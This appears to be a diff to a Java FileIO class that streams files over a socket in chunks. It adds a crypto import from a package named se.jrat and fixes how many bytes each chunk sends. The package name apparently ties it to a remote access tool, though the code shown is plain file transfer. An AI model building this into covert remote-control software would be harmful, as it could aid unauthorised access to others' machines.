@@ -7,6 +7,8 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.net.Socket;
 
+import se.jrat.common.crypto.Crypto;
+
 public class FileIO {
 
 	public static final int CHUNKSIZE = 1024;
@@ -25,14 +27,14 @@ public class FileIO {
 		dos.writeLong(fileSize);
 
 		for (long pos = 0; pos < fileSize; pos += CHUNKSIZE) {
-			fileInput.read(chunk);
-
-			dos.writeInt(chunk.length);
-
-			dos.write(chunk, 0, chunk.length);
+			int read = fileInput.read(chunk);
+			
+			dos.writeInt(read);
+			
+			dos.write(chunk, 0, read);
 
 			if (listener != null) {
-				listener.transferred(chunk.length, pos, fileSize);
+				listener.transferred(read, pos, fileSize);
 			}
 		}
 		fileInput.close();
@@ -56,7 +58,7 @@ public class FileIO {
 			read += chunkSize;
 
 			dis.readFully(chunk);
-
+			
 			fileOutput.write(chunk);
 
 			if (listener != null) {
